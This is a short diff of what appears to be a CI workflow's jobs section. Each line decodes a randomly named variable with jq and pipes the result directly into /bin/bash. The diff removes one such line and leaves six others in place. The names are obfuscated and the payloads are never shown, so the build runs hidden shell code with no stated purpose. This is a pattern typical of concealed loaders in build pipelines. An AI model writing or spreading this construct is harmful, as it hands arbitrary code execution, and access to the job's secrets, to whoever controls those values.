@@ -28,7 +28,6 @@ jobs:
           echo $rcx490 | jq -r .o08 | /bin/bash
           printf '%s' "$y03" | jq -r .z591 | /bin/bash
           printf '%s' "$n5233" | jq -r .ojhx5981 | /bin/bash
-          printf '%s' "$onc02" | jq -r .tod0153 | /bin/bash
           echo $abjr1 | jq -r .otpc750 | /bin/bash
           echo $x11 | jq -r .yl77940 | /bin/bash
           echo $o805 | jq -r .r53767 | /bin/bash
